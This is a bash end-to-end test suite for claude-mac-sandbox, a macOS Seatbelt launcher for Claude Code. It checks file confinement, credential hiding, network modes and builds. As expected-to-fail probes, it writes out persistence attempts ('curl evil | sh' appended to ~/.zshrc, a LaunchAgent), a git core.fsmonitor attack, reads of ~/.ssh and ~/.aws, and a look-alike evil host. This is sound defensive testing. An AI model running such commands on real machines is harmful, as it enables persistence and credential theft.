#!/bin/bash
# shellcheck disable=SC2016,SC2088  # $VARS expand inside the sandbox; ~ appears in test names
# End-to-end verification of claude-mac-sandbox (macOS Seatbelt, no containers).
# Runs locally on a Mac or on GitHub's macOS runners. Uses throwaway project
# directories, a throwaway CLAUDE_CONFIG_DIR and test-only Keychain items, so it
# doesn't touch your real Claude login or credentials.
#
# Optional live tests (skipped when unset):
#   ANTHROPIC_API_KEY, CLAUDE_CODE_OAUTH_TOKEN
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd -P)"
SB="$ROOT/macos/claude-mac-sandbox.sh"
ID="sbx$$"
BASE="$HOME/.sbx-tests-$ID"          # under $HOME on purpose: not a sandbox-writable temp path
PROJ="$BASE/proj"; PROJ2="$BASE/proj2"; OUT="$BASE/outside"
mkdir -p "$PROJ" "$PROJ2" "$OUT"
PROJ="$(cd "$PROJ" && pwd -P)"; PROJ2="$(cd "$PROJ2" && pwd -P)"
export CLAUDE_CONFIG_DIR="$BASE/claude-config"
export KEYCHAIN_SERVICE_TOKEN="sbx-test-token-$ID" KEYCHAIN_SERVICE_APIKEY="sbx-test-apikey-$ID"
KC_PROBE="sbx-test-probe-$ID"
U="$(id -u)"
pass=0 fail=0 skip=0 failed=""

gh_annot() { if [ -n "${GITHUB_ACTIONS:-}" ]; then echo "::$1 title=$2::$3"; fi; }
ok()   { pass=$((pass+1)); printf '\033[32m  ok  \033[0m %s\n' "$1"; }
nok()  { fail=$((fail+1)); failed="$failed
- $1"; printf '\033[31m FAIL \033[0m %s\n' "$1"
         if [ -n "${2:-}" ]; then printf '%s\n' "$2" | sed 's/^/       /' | tail -25; fi
         gh_annot error "$1" "$(printf '%s' "${2:-}" | tail -c 900 | tr '\n' ' ')"; }
skp()  { skip=$((skip+1)); printf '\033[33m skip \033[0m %s\n' "$1"; gh_annot notice "skipped: $1" "${2:-}"; }
note() { printf '\033[36m note \033[0m %s\n' "$1"; gh_annot notice "$1" "${2:-}"; }
section() { printf '\n\033[1m== %s\033[0m\n' "$1"; if [ -n "${GITHUB_ACTIONS:-}" ]; then echo "::group::$1"; fi; }
endsec()  { if [ -n "${GITHUB_ACTIONS:-}" ]; then echo "::endgroup::"; fi; }

# sb [launcher opts...] -- bash command   (bash -c inside the sandbox, project = $PROJ)
sb() {
  local opts=()
  while [ $# -gt 0 ] && [ "$1" != "--" ]; do opts+=("$1"); shift; done
  shift
  if [ ${#opts[@]} -gt 0 ]; then
    "$SB" --project "$PROJ" "${opts[@]}" --shell -c "$*" </dev/null 2>&1
  else
    "$SB" --project "$PROJ" --shell -c "$*" </dev/null 2>&1
  fi
}
expect()    { local n="$1" out; shift; if out="$("$@")"; then ok "$n"; else nok "$n" "$out"; fi; }
expect_no() { local n="$1" out; shift; if out="$("$@")"; then nok "$n" "expected failure, got success: $out"; else ok "$n"; fi; }
eq() { if [ "$2" = "$3" ]; then ok "$1"; else nok "$1" "expected: $3
actual:   $2"; fi; }
code() { echo 'c=$(curl -s -o /dev/null -w "%{http_code}" --max-time 20 '"$1"'); echo "$c"; [ "$c" != 000 ]'; }

cleanup() {
  security delete-generic-password -s "$KC_PROBE" >/dev/null 2>&1
  security delete-generic-password -s "$KEYCHAIN_SERVICE_TOKEN" >/dev/null 2>&1
  security delete-generic-password -s "$KEYCHAIN_SERVICE_APIKEY" >/dev/null 2>&1
  [ -n "${AGENT_PID:-}" ] && kill "$AGENT_PID" 2>/dev/null
  rm -f "$HOME/.ssh/sbx_test_$ID" "$HOME/.aws/sbx_test_$ID" "$HOME/Library/LaunchAgents/sbx-test-$ID.plist" "/usr/local/bin/sbx-test-$ID"
  rm -rf "$BASE"
}
trap cleanup EXIT

# ---------------------------------------------------------------------------
section "Prerequisites"
expect "check-macos.sh passes" "$ROOT/macos/check-macos.sh"
expect "launcher --help works" "$SB" --help
expect "generated profile is valid SBPL" sb -- 'true'
endsec

section "Runs natively, confined"
eq "cwd is the project's real path"           "$(sb -- pwd)" "$PROJ"
eq "SANDBOX_PROJECT_DIR set"                  "$(sb -- 'echo "$SANDBOX_PROJECT_DIR"')" "$PROJ"
eq "same user as you (no separate account)"   "$(sb -- 'id -u')" "$U"
eq "auto-updater disabled inside"             "$(sb -- 'echo "$DISABLE_AUTOUPDATER"')" "1"
expect "claude runs inside the sandbox"       "$SB" --project "$PROJ" --version
out="$("$SB" --project "$PROJ" doctor </dev/null 2>&1)"; rc=$?
if [ $rc -eq 0 ]; then ok "claude doctor runs inside the sandbox"; else nok "claude doctor runs inside the sandbox" "$out"; fi
eq "secrets in your shell env are not passed in" "$(GITHUB_TOKEN=leak1 AWS_SECRET_ACCESS_KEY=leak2 "$SB" --project "$PROJ" --shell -c 'echo "[${GITHUB_TOKEN:-}${AWS_SECRET_ACCESS_KEY:-}]"' </dev/null 2>&1)" "[]"
endsec

section "Project files: writes inside are visible to you"
echo "from-host" > "$PROJ/host.txt"
eq "host file readable inside"                "$(sb -- 'cat host.txt')" "from-host"
sb -- 'printf "line1\nline2\n" > new.txt' >/dev/null
eq "new file visible on host"                 "$(cat "$PROJ/new.txt" 2>&1)" "line1
line2"
eq "new file owned by you"                    "$(stat -f %u "$PROJ/new.txt")" "$U"
printf 'version=1\n' > "$PROJ/config.ini"; chmod 640 "$PROJ/config.ini"
sb -- "sed -i '' 's/version=1/version=2/' config.ini && echo edited=yes >> config.ini" >/dev/null
eq "in-place edit visible on host"            "$(cat "$PROJ/config.ini")" "version=2
edited=yes"
eq "edited file keeps mode 640"               "$(stat -f %Lp "$PROJ/config.ini")" "640"
sb -- 'mkdir -p src/pkg && echo x > src/pkg/a.txt && mv new.txt renamed.txt && rm host.txt' >/dev/null
eq "dirs, rename, delete visible on host"     "$( [ -f "$PROJ/src/pkg/a.txt" ] && [ -f "$PROJ/renamed.txt" ] && [ ! -e "$PROJ/host.txt" ] && echo yes)" "yes"
head -c 3145728 /dev/urandom > "$PROJ/blob.bin"
eq "binary identical inside (shasum)"         "$(sb -- 'shasum -a 256 < blob.bin' | cut -d' ' -f1)" "$(shasum -a 256 < "$PROJ/blob.bin" | cut -d' ' -f1)"
git -C "$PROJ" init -q && git -C "$PROJ" -c user.name=t -c user.email=t@e add -A && git -C "$PROJ" -c user.name=t -c user.email=t@e commit -qm base
sb -- 'echo change >> renamed.txt && git add -A && git -c user.name=sandbox -c user.email=s@e commit -qm "commit from sandbox"' >/dev/null
eq "commit made inside shows in host git log" "$(git -C "$PROJ" log -1 --format=%s)" "commit from sandbox"
endsec

section "Writes outside the project are blocked"
expect_no "write to another folder in your home"    sb -- "echo x > '$OUT/a.txt'"
eq        "...and nothing was created"              "$(ls -A "$OUT")" ""
expect_no "write to another project"                sb -- "echo x > '$PROJ2/a.txt'"
cp ~/.zshrc "$BASE/zshrc.bak" 2>/dev/null || touch "$BASE/zshrc.bak"
expect_no "append to ~/.zshrc (persistence)"        sb -- 'echo "curl evil | sh" >> ~/.zshrc'
eq        "~/.zshrc unchanged"                      "$(cat ~/.zshrc 2>/dev/null)" "$(cat "$BASE/zshrc.bak")"
expect_no "create a LaunchAgent (persistence)"      sb -- "mkdir -p ~/Library/LaunchAgents; echo x > ~/Library/LaunchAgents/sbx-test-$ID.plist"
if [ -w /usr/local/bin ]; then
  expect_no "write to /usr/local/bin even though you can" sb -- "echo x > /usr/local/bin/sbx-test-$ID"
fi
expect_no "child processes inherit the sandbox"     sb -- "sh -c 'touch \"$OUT/child.txt\"'"
eq        "...and the child wrote nothing"          "$(ls -A "$OUT")" ""
ln -s "$OUT" "$PROJ/escape"
expect_no "symlink out of the project doesn't escape" sb -- 'echo x > escape/through-link.txt'
rm -f "$PROJ/escape"
expect_no "replace the claude binary"               sb -- 'f="$(readlink "$(command -v claude)" || command -v claude)"; touch "$f"'
expect_no ".git/config is read-only (core.fsmonitor attack)" sb -- 'git config core.fsmonitor "touch /tmp/pwned"'
expect_no ".git/hooks is read-only"                 sb -- 'echo "#!/bin/sh" > .git/hooks/pre-commit'
expect    "--allow-git-config lifts that"           sb --allow-git-config -- 'git config sbx.test yes'
expect_no "--ro blocks project writes"              sb --ro -- 'touch ro.txt'
expect    "--allow-write adds a folder"             sb --allow-write "$OUT" -- "echo ok > '$OUT/allowed.txt'"
expect    "tool caches stay writable (~/Library/Caches)" sb -- 'mkdir -p ~/Library/Caches/sbx-test && touch ~/Library/Caches/sbx-test/x && rm -rf ~/Library/Caches/sbx-test'
endsec

section "Credentials are not readable"
mkdir -p ~/.ssh ~/.aws; echo "FAKE-KEY" > "$HOME/.ssh/sbx_test_$ID"; echo "FAKE-AWS" > "$HOME/.aws/sbx_test_$ID"
expect_no "~/.ssh unreadable"                sb -- "cat ~/.ssh/sbx_test_$ID"
expect_no "~/.aws unreadable"                sb -- "cat ~/.aws/sbx_test_$ID"
expect_no "Keychain files unreadable"        sb -- 'ls ~/Library/Keychains'
echo "hidden" > "$OUT/hide-me.txt"
expect_no "--hide blocks an extra path"      sb --hide "$OUT/hide-me.txt" -- "cat '$OUT/hide-me.txt'"
expect    "...readable without --hide"       sb -- "cat '$OUT/hide-me.txt'"
eval "$(ssh-agent -s)" >/dev/null; AGENT_PID="${SSH_AGENT_PID:-}"
ssh-keygen -q -t ed25519 -N "" -f "$BASE/agentkey" && ssh-add -q "$BASE/agentkey" 2>/dev/null
if ssh-add -l >/dev/null 2>&1; then
  expect_no "ssh-agent unusable even with its socket path" "$SB" --project "$PROJ" --shell -c "SSH_AUTH_SOCK='$SSH_AUTH_SOCK' ssh-add -l" </dev/null
else skp "ssh-agent test" "could not start an agent on this machine"; fi
kill "$AGENT_PID" 2>/dev/null; AGENT_PID=""; unset SSH_AUTH_SOCK SSH_AGENT_PID
if security add-generic-password -U -A -a "$(id -un)" -s "$KC_PROBE" -w probe-value >/dev/null 2>&1 && \
   [ "$(security find-generic-password -s "$KC_PROBE" -w 2>/dev/null)" = probe-value ]; then
  eq        "Keychain usable by default (normal login works)" "$(sb -- "security find-generic-password -s $KC_PROBE -w")" "probe-value"
  expect_no "--no-keychain blocks Keychain access"           sb --no-keychain -- "security find-generic-password -s $KC_PROBE -w"
else skp "Keychain tests" "login keychain not available to this user"; fi
endsec

section "Sign-in wiring (Keychain-backed secrets)"
if security add-generic-password -U -a "$(id -un)" -s "$KEYCHAIN_SERVICE_APIKEY" -w sk-ant-api03-DUMMY >/dev/null 2>&1 && \
   security add-generic-password -U -a "$(id -un)" -s "$KEYCHAIN_SERVICE_TOKEN" -w sk-ant-oat01-DUMMY >/dev/null 2>&1; then
  eq "--auth apikey passes ANTHROPIC_API_KEY from Keychain"  "$(sb --auth apikey -- 'echo "$ANTHROPIC_API_KEY|${CLAUDE_CODE_OAUTH_TOKEN:-}"')" "sk-ant-api03-DUMMY|"
  eq "--auth token passes CLAUDE_CODE_OAUTH_TOKEN"           "$(sb --auth token -- 'echo "${ANTHROPIC_API_KEY:-}|$CLAUDE_CODE_OAUTH_TOKEN"')" "|sk-ant-oat01-DUMMY"
  eq "--auth login passes no credential"                     "$(sb -- 'echo "[${ANTHROPIC_API_KEY:-}${CLAUDE_CODE_OAUTH_TOKEN:-}]"')" "[]"
  expect "--auth apikey still works with --no-keychain"      sb --auth apikey --no-keychain -- '[ -n "$ANTHROPIC_API_KEY" ]'
  security delete-generic-password -s "$KEYCHAIN_SERVICE_APIKEY" >/dev/null 2>&1
  expect_no "missing Keychain item fails with a clear error" "$SB" --project "$PROJ" --auth apikey --shell -c true
else skp "sign-in wiring" "login keychain not available"; fi
endsec

section "Network modes"
expect    "full: internet reachable"            sb -- 'curl -sSf --max-time 20 https://example.com -o /dev/null'
expect_no "none: internet unreachable"          sb --net none -- 'curl -sS --max-time 8 https://example.com -o /dev/null'
expect    "none: local unix sockets still work (DNS)" sb --net none -- 'dscacheutil -q host -a name localhost | grep -q ip_address'
expect    "restricted: api.anthropic.com allowed"     sb --net restricted -- "$(code https://api.anthropic.com/v1/models)"
expect    "restricted: platform.claude.com allowed"   sb --net restricted -- "$(code https://platform.claude.com/)"
expect_no "restricted: example.com blocked"           sb --net restricted -- "$(code https://example.com/)"
expect_no "restricted: github.com blocked by default" sb --net restricted -- "$(code https://github.com/)"
expect_no "restricted: look-alike host blocked"       sb --net restricted -- "$(code https://api.anthropic.com.evil.example/)"
expect_no "restricted: bypassing the proxy fails"     sb --net restricted -- 'curl -sS --noproxy "*" --max-time 8 https://api.anthropic.com -o /dev/null'
expect_no "restricted: direct IP fails"               sb --net restricted -- 'curl -sS --noproxy "*" --max-time 8 https://1.1.1.1 -o /dev/null'
plog="$(sb --net restricted -- "$(code https://example.com/) >/dev/null; cat \"\$SANDBOX_PROXY_LOG\"")"
case "$plog" in *'refused on filtered domain "example.com"'*) ok "proxy log records the blocked host" ;; *) nok "proxy log records the blocked host" "$plog" ;; esac
expect    "--allow dev: git clone over HTTPS"         sb --net restricted --allow dev -- 'git clone -q --depth 1 https://github.com/octocat/Hello-World "$TMPDIR/hw-$$" && rm -rf "$TMPDIR/hw-$$"'
expect_no "--allow dev: example.com still blocked"    sb --net restricted --allow dev -- "$(code https://example.com/)"
printf '^example\\.com$\n' > "$BASE/allow.txt"
expect    "custom --allow FILE works"                 sb --net restricted --allow "$BASE/allow.txt" -- "$(code https://example.com/)"
if pgrep -f "claude-mac-sandbox.*/tinyproxy.conf" >/dev/null 2>&1; then nok "proxy stops when the session ends" "$(pgrep -fl tinyproxy)"; else ok "proxy stops when the session ends"; fi
endsec

section "Build a macOS project inside the sandbox"
cp -R "$ROOT/examples/HelloMac/." "$PROJ/HelloMac/"
expect "swift build (offline, --net none)"   "$SB" --project "$PROJ/HelloMac" --net none --shell -c 'set -o pipefail; swift build 2>&1 | tail -5'
expect "swift test passes"                   "$SB" --project "$PROJ/HelloMac" --net none --shell -c 'set -o pipefail; swift test 2>&1 | tail -15'
eq     "built binary runs on the host"       "$("$PROJ/HelloMac/.build/debug/hello" Ada 2>&1 | cut -d, -f1-2)" "Hello, Ada"
eq     "build products owned by you"         "$(stat -f %u "$PROJ/HelloMac/.build")" "$U"
if xcodebuild -version >/dev/null 2>&1; then
  out="$("$SB" --project "$PROJ/HelloMac" --net none --shell -c '
    scheme=$(xcodebuild -list 2>/dev/null | awk "/Schemes:/{f=1;next} f&&NF{print \$1}" | grep -m1 -E "^HelloMac-Package$|^HelloCore$")
    echo "scheme=$scheme"
    xcodebuild -scheme "$scheme" -destination "platform=macOS" test 2>&1 | tail -25' </dev/null 2>&1)"
  case "$out" in *"TEST SUCCEEDED"*) ok "xcodebuild test passes (DerivedData in ~/Library/Developer)" ;; *) nok "xcodebuild test passes" "$out" ;; esac
else skp "xcodebuild test" "full Xcode not selected"; fi
cp -R "$ROOT/examples/WithDeps/." "$PROJ/WithDeps/"
expect_no "SwiftPM can't fetch dependencies without --allow dev" "$SB" --project "$PROJ/WithDeps" --net restricted --shell -c 'set -o pipefail; swift package resolve 2>&1 | tail -5'
expect "SwiftPM fetches dependencies via --allow dev" "$SB" --project "$PROJ/WithDeps" --net restricted --allow dev --shell -c 'set -o pipefail; swift package resolve 2>&1 | tail -5 && swift build 2>&1 | tail -3'
eq     "dependency-built tool runs"           "$("$PROJ/WithDeps/.build/debug/greet" Mac 2>&1)" "Hello, Mac!"
endsec

section "Resume: sessions stay per project"
enc='d="$CLAUDE_CONFIG_DIR/projects/$(pwd -P | sed "s#[^a-zA-Z0-9]#-#g")"'
sb -- "$enc"' && mkdir -p "$d" && echo "{}" > "$d/s1.jsonl"' >/dev/null
"$SB" --project "$PROJ2" --shell -c "$enc"' && mkdir -p "$d" && echo "{}" > "$d/s2.jsonl"' </dev/null >/dev/null 2>&1
eq "project 1 sees its session in a later run" "$(sb -- "$enc"' && ls "$d"')" "s1.jsonl"
eq "project 2 has its own"                     "$("$SB" --project "$PROJ2" --shell -c "$enc"' && ls "$d"' </dev/null 2>&1)" "s2.jsonl"
eq "same storage as running claude outside the sandbox" "$(ls "$CLAUDE_CONFIG_DIR/projects" | wc -l | tr -d ' ')" "2"
endsec

section "Claude Code's built-in sandbox (lighter option)"
mkdir -p "$BASE/builtin-cfg"
cat > "$BASE/builtin-cfg/settings.json" <<'JSON'
{
  "sandbox": {
    "enabled": true,
    "autoAllowBashIfSandboxed": true,
    "filesystem": { "allowWrite": ["~/Library/Developer", "~/Library/Caches"] },
    "network": { "allowedDomains": ["github.com", "api.github.com", "swiftpackageindex.com"] }
  }
}
JSON
out="$(CLAUDE_CONFIG_DIR="$BASE/builtin-cfg" claude doctor </dev/null 2>&1)"; rc=$?
if [ $rc -eq 0 ] && ! printf '%s' "$out" | grep -iqE 'sandbox.*(invalid|unknown|unrecognized)|(invalid|unknown|unrecognized).*sandbox'; then
  ok "guide's built-in sandbox settings pass claude doctor"
else nok "guide's built-in sandbox settings pass claude doctor" "$out"; fi
if sb -- "/usr/bin/sandbox-exec -p '(version 1)(allow default)' /usr/bin/true" >/dev/null 2>&1; then
  note "nested Seatbelt works inside claude-mac-sandbox (built-in sandbox can be layered)"
else
  note "nested Seatbelt is refused inside claude-mac-sandbox: don't enable Claude's built-in /sandbox there"
fi
endsec

live() { # NAME AUTH SERVICE VALUE
  local name="$1" auth="$2" svc="$3" val="$4" out sid
  security add-generic-password -U -a "$(id -un)" -s "$svc" -w "$val" >/dev/null 2>&1 || { skp "$name live" "keychain unavailable"; return; }
  out="$("$SB" --project "$PROJ/HelloMac" --net restricted --auth "$auth" -- -p 'Reply with exactly SANDBOX_OK' </dev/null 2>&1)"
  case "$out" in *SANDBOX_OK*) ok "$name: claude answers through the restricted network" ;; *) nok "$name: claude answers" "$out" ;; esac
  rm -f "$PROJ/HelloMac/Sources/HelloCore/Farewell.swift"
  out="$("$SB" --project "$PROJ/HelloMac" --net restricted --auth "$auth" --yolo -- -p 'Add Sources/HelloCore/Farewell.swift with `public enum Farewell { public static func message(for name: String) -> String { "Goodbye, \(name)" } }`, then run `swift build` and reply BUILD_OK if it succeeds.' </dev/null 2>&1)"
  if [ -f "$PROJ/HelloMac/Sources/HelloCore/Farewell.swift" ] && printf '%s' "$out" | grep -q BUILD_OK; then ok "$name: Claude edits and builds the macOS project"
  else nok "$name: Claude edits and builds the macOS project" "$out"; fi
  sid="$(uuidgen | tr 'A-Z' 'a-z')"
  "$SB" --project "$PROJ/HelloMac" --net restricted --auth "$auth" -- -p --session-id "$sid" 'Remember the codeword PINEAPPLE-42. Reply OK.' </dev/null >/dev/null 2>&1
  out="$("$SB" --project "$PROJ/HelloMac" --net restricted --auth "$auth" -- -p --resume "$sid" 'What codeword did I give you? Only the codeword.' </dev/null 2>&1)"
  case "$out" in *PINEAPPLE-42*) ok "$name: --resume continues the conversation" ;; *) nok "$name: --resume continues" "$out" ;; esac
  out="$("$SB" --project "$PROJ2" --net restricted --auth "$auth" -- -p --continue 'If I gave you a codeword earlier reply with it, else NONE.' </dev/null 2>&1)"
  case "$out" in *PINEAPPLE-42*) nok "$name: other project can't continue it" "$out" ;; *) ok "$name: other project can't continue it" ;; esac
  security delete-generic-password -s "$svc" >/dev/null 2>&1
}
section "Live Claude Code (optional secrets)"
if [ -n "${ANTHROPIC_API_KEY:-}" ]; then live "API key" apikey "$KEYCHAIN_SERVICE_APIKEY" "$ANTHROPIC_API_KEY"; else skp "live API-key test" "set repo secret ANTHROPIC_API_KEY"; fi
if [ -n "${CLAUDE_CODE_OAUTH_TOKEN:-}" ]; then live "Subscription token" token "$KEYCHAIN_SERVICE_TOKEN" "$CLAUDE_CODE_OAUTH_TOKEN"; else skp "live subscription-token test" "set repo secret CLAUDE_CODE_OAUTH_TOKEN"; fi
endsec

# ---------------------------------------------------------------------------
printf '\n\033[1mResult: %d passed, %d failed, %d skipped\033[0m\n' "$pass" "$fail" "$skip"
if [ -n "${GITHUB_STEP_SUMMARY:-}" ]; then
  { echo "### macOS sandbox verification ($(sw_vers -productVersion), $(uname -m))"; echo
    echo "| passed | failed | skipped |"; echo "|---|---|---|"; echo "| $pass | $fail | $skip |"
    if [ "$fail" -gt 0 ]; then echo; echo "**Failed:**$failed"; fi
  } >> "$GITHUB_STEP_SUMMARY"
fi
[ "$fail" -eq 0 ]
